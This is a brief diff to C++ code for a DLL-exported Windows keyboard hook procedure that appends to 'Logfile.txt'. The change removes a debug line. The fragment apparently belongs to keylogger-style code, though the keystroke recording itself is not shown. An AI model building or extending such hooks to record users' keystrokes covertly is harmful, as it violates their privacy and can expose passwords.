@@ -10,7 +10,6 @@ extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPA
 
         std::ofstream LogFile;
         LogFile.open("Logfile.txt", std::ios_base::app);
-        LogFile << "Hook executed" << std::endl;
 
         //check key up flag not set
         if (!(HIWORD(lParam) & KF_UP)) {
